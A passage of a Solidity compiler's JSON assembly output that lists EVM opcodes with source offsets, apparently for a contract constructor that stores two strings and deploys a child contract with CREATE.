									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "1F"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "9"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "100"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "EXP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "NOT",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "tag",
									"source": 3,
									"value": "9"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP5",
									"source": 3
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "1F"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "16"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "100"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "EXP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "NOT",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "tag",
									"source": 3,
									"value": "16"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 519,
									"end": 704,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 615,
									"end": 625,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 603,
									"end": 612,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "19"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "JUMP",
									"source": 3,
									"value": "[in]"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "tag",
									"source": 3,
									"value": "19"
								},
								{
									"begin": 603,
									"end": 625,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 603,
									"end": 625,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 650,
									"end": 662,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 647,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "21"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "JUMP",
									"source": 3,
									"value": "[in]"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "tag",
									"source": 3,
									"value": "21"
								},
								{
									"begin": 636,
									"end": 662,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 636,
									"end": 662,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "22"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "23"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "JUMP",
									"source": 3,
									"value": "[in]"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "tag",
									"source": 3,
									"value": "22"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 683,
									"end": 696,
									"name": "CREATE",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 683,
									"end": 696,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "24"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 45,
									"end": 61,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 42,
									"end": 43,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 39,
									"end": 40,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 24,
									"end": 62,
									"name": "RETURNDATACOPY",
									"source": -1
								},
								{
									"begin": 77,
									"end": 93,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 74,
									"end": 75,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 67,
									"end": 94,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"source": -1,
									"value": "24"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 683,
									"end": 696,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 673,
									"end": 680,
									"name": "PUSH",
									"source": 3,
									"value": "3"
								},
								{
									"begin": 673,
									"end": 680,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 673,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "100"
								},
								{
									"begin": 673,
									"end": 696,
									"name": "EXP",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "SLOAD",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 673,
									"end": 696,
									"name": "MUL",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "NOT",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "PUSH",
									"source": 3,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 673,
									"end": 696,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "MUL",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "OR",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 673,
									"end": 696,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 519,
									"end": 704,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "25"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SLOAD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "100"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "MUL",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "2"
								},
								{
									"begin": 367,
									"end": 17651,
